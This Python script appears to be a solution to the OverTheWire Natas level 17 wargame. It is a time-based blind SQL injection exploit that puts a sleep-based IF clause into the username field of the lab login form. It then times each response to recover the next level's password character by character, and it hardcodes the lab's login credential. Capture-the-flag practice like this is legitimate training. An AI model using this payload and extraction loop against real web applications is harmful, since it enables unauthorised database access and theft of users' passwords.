#!/usr/bin/env python3

import requests
import time
from string import digits, ascii_letters

CHARS = ascii_letters + digits
ADDR = "http://natas17.natas.labs.overthewire.org/index.php"
CREDS = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

QUERY = "natas18 and IF(password like binary \"n%\", sleep(5), \"\") # -- "


def output(passw, currentChar, end):
    print(f"{len(passw)} out of X chars found: {passw + currentChar}", end=end)


s = requests.session()
s.auth = CREDS

password = ""
while True:
    pass_copy = password

    for char in CHARS:
        output(password, char, "\r")

        payload = {"username" : f"natas18\" and IF(password like binary \"{password + char}%\", sleep(3), \"\") # --"}
        pre_time = time.time()
        resp = s.post(ADDR, data=payload)
        time_diff = time.time() - pre_time
        print(password + char + " : " + str(time_diff), end="\r")
        if time_diff >= 2:
            password += char
            break

    if password == pass_copy:
        output(password, "", "")
        break
